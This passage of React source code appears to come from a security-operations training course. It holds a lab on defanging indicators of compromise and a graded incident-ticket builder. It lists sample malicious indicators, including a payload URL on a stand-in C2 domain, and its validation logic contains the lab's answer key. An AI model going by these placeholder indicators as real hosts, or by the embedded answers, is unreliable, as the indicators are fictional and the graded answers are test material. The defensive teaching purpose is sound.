        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <FileText className="w-4 h-4 text-primary" />
            Interactive Defanging Sandbox: Preventing Accidental Clicks
          </span>
          <Badge variant="outline" className="text-xs">Security Hygiene Standard</Badge>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
          <div className="space-y-1">
            <span className="text-rose-600 font-bold">⚠️ Dangerous Clickable IOCs:</span>
            <div className="p-3 rounded-xl bg-rose-50 dark:bg-rose-950/20 border border-rose-200 font-mono text-[11px] space-y-1 text-rose-950 dark:text-rose-200">
              <div>http://evil-c2-domain.com/payload.exe</div>
              <div>185.220.101.5</div>
              <div>ftp://malicious-drop.net</div>
            </div>
          </div>

          <div className="space-y-1">
            <span className="text-emerald-600 font-bold">🛡️ Defanged Safe Documentation:</span>
            <div className="p-3 rounded-xl bg-emerald-50 dark:bg-emerald-950/20 border border-emerald-200 font-mono text-[11px] space-y-1 text-emerald-950 dark:text-emerald-200">
              {defanged ? (
                <>
                  <div>hxxp://evil-c2-domain[.]com/payload[.]exe</div>
                  <div>185[.]220[.]101[.]5</div>
                  <div>fxp://malicious-drop[.]net</div>
                </>
              ) : (
                <div className="text-muted-foreground italic">Click Defang to sanitize indicators...</div>
              )}
            </div>
          </div>
        </div>

        <div className="pt-2 flex items-center justify-between">
          <Button
            size="sm"
            onClick={() => {
              setDefanged(true);
              onComplete();
            }}
            className="text-xs font-bold bg-primary text-white"
          >
            Sanitize & Defang All Indicators
          </Button>

          {defanged && (
            <Badge className="bg-emerald-600 text-white text-xs gap-1 py-1 px-3">
              <CheckCircle2 className="w-3.5 h-3.5" />
              All Indicators Defanged! Ready for Documentation
            </Badge>
          )}
        </div>
      </div>

      {/* UTC Timeline Standard */}
      <div className="p-4 rounded-xl border bg-muted/20 text-xs space-y-2">
        <h4 className="font-bold text-foreground flex items-center gap-1.5">
          <Clock className="w-3.5 h-3.5 text-primary" />
          The UTC Chronology Standard (ISO 8601)
        </h4>
        <p className="text-muted-foreground leading-relaxed">
          Never write "3:00 PM EST"—global teams in London and Singapore will misinterpret the timeline. Always use: <code className="text-foreground font-mono font-bold">2026-09-29 14:15:00 UTC</code>.
        </p>
      </div>
    </div>
  );
}

// =========================================================================
// UNIT 7, TOPIC 7.2: [Lab] 🔵 Create an Incident Ticket
// Full SecOps Incident Ticket Builder
// =========================================================================
function StoryTopic72({ onComplete, isDone }: { onComplete: () => void; isDone: boolean }) {
  const [priority, setPriority] = useState<string>('');
  const [execSummary, setExecSummary] = useState<string>('');
  const [defangedIoc, setDefangedIoc] = useState<string>('');
  const [recommendation, setRecommendation] = useState<string>('');
  const [audited, setAudited] = useState(false);

  const isValid =
    priority === 'P2' &&
    execSummary === 'valid-summary' &&
    defangedIoc.includes('185[.]220[.]101[.]5') &&
    recommendation === 'asr-rule';

  const handleAudit = () => {
    setAudited(true);
    if (isValid) {
      onComplete();
    }
  };

  return (
    <div className="space-y-6">
      {/* Incident Case Briefing */}
      <div className="p-4 rounded-xl border border-sky-200 bg-sky-50/50 dark:bg-sky-950/20 text-xs space-y-1 text-sky-950 dark:text-sky-200">
        <strong className="block font-bold">Case Briefing #INC-9014:</strong>
        <p>
          User <code>jdoe-finance</code> opened malicious spreadsheet <code>Invoice_Q3.xlsm</code> on <code>WKSTN-FIN-042</code>. Obfuscated PowerShell connected to <code>185.220.101.5</code>. Host was isolated by L1 at 14:28 UTC. Build the official ticket!
        </p>
      </div>

      {/* Ticket Builder Workstation */}
      <div className="p-5 sm:p-6 rounded-2xl border bg-card space-y-4 shadow-xs">
        <div className="flex items-center justify-between text-xs border-b pb-3">
          <span className="font-bold text-foreground flex items-center gap-1.5">
            <FileCode className="w-4 h-4 text-primary" />
            [Lab] 🔵 SecOps Incident Ticket Builder (ServiceNow / Jira Style)
          </span>
          <Badge className="bg-primary text-white text-[10px]">TICKET DRAFT</Badge>
        </div>

        {/* Priority & Classification */}
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
          <div className="space-y-1">
            <label className="font-semibold text-foreground">Priority Rating:</label>
            <select
              value={priority}
              onChange={(e) => setPriority(e.target.value)}
              className="w-full p-2 rounded-lg border bg-muted/20 text-xs"
            >
              <option value="">-- Select Priority --</option>
              <option value="P1">P1 - Critical (Entire enterprise down)</option>
              <option value="P2">P2 - High (Contained living-off-the-land malware on workstation)</option>
              <option value="P4">P4 - Low (Informational)</option>
            </select>
          </div>

          <div className="space-y-1">
            <label className="font-semibold text-foreground">Defanged C2 Indicator:</label>
            <input
              type="text"
              placeholder="e.g. 185[.]220[.]101[.]5"
              value={defangedIoc}
              onChange={(e) => setDefangedIoc(e.target.value)}
              className="w-full p-2 rounded-lg border bg-muted/20 font-mono text-xs"
            />
          </div>
        </div>

        {/* Executive Summary */}
        <div className="space-y-1 text-xs">
          <label className="font-semibold text-foreground">Executive Summary (Objective & Blameless):</label>
          <select
            value={execSummary}
            onChange={(e) => setExecSummary(e.target.value)}
            className="w-full p-2 rounded-lg border bg-muted/20 text-xs"
          >
            <option value="">-- Select Executive Summary Formulation --</option>
            <option value="blame-user">"User was careless and downloaded a virus from the internet."</option>
            <option value="valid-summary">"On 2026-09-29 at 14:15 UTC, host WKSTN-FIN-042 was compromised via an Excel macro stager. Endpoint isolated at 14:28 UTC with zero data exfiltration."</option>
            <option value="unverified">"We think hackers from another country broke into the system somehow."</option>
          </select>
        </div>

        {/* Strategic Preventative Recommendation */}
        <div className="space-y-1 text-xs">
          <label className="font-semibold text-foreground">Strategic Remediation Recommendation:</label>
          <select
            value={recommendation}
            onChange={(e) => setRecommendation(e.target.value)}
            className="w-full p-2 rounded-lg border bg-muted/20 text-xs"
          >
            <option value="">-- Select Recommendation --</option>
            <option value="reboot">Tell the user to reboot their computer twice a week</option>
            <option value="asr-rule">Deploy Microsoft Defender ASR rule: Block Office applications from creating child processes</option>
            <option value="delete-excel">Uninstall Microsoft Excel from the entire company</option>
          </select>
        </div>

        {/* Audit & Submit */}
        <div className="pt-2 flex items-center justify-between border-t">
          <Button size="sm" onClick={handleAudit} className="text-xs font-bold bg-primary text-white">
            Audit & Submit Official SecOps Ticket
          </Button>

          {audited && isValid && (
            <Badge className="bg-emerald-600 text-white text-xs gap-1 py-1 px-3">
              <CheckCircle2 className="w-3.5 h-3.5" />
              Ticket Passed Audit! 100% Quality Score (+60 XP)
            </Badge>
          )}

          {audited && !isValid && (
            <Badge variant="outline" className="text-rose-600 bg-rose-50 border-rose-200 text-xs">
              Ticket failed audit. Check Priority, Defanged IP format, or Recommendation!
            </Badge>
          )}
        </div>
      </div>
    </div>
  );
}
